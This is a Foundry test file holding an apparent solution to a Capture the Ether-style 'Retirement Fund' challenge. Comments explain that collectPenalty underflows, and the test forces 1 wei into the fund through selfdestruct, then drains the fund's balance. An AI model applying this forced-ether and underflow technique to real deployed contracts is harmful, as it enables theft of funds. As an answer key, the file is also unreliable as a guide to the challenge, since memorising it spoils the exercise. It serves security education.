// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/RetirementFund.sol";

contract RetirementFundTest is Test {
    RetirementFund public retirementFund;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        retirementFund = (new RetirementFund){value: 1 ether}(address(this));
        exploitContract = new ExploitContract(retirementFund);
    }

    function testIncrement() public {
        vm.deal(address(exploitContract), 1 ether);
        // Test your Exploit Contract below
        // Use the instance retirementFund and exploitContract

        // Put your solution here

        // The collectPenalty method is vulnerable to overflow
        //
        // The penalty is calculated by subtracting the current balance from the initial balance
        // without checking if the current balance is greater than the initial balance.

        // 1. Top up the retirementFund with 1 wei to increase the balance enough to overflow
        //
        // Since the retirementFund contract has no payable function, we can use the selfdestruct method
        // on the exploitContract
        exploitContract.destroy{value: 1 wei}();

        // 2. Collect the penalty
        // It will send the all the balance of the retirementFund to the exploitContract
        retirementFund.collectPenalty();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(retirementFund.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
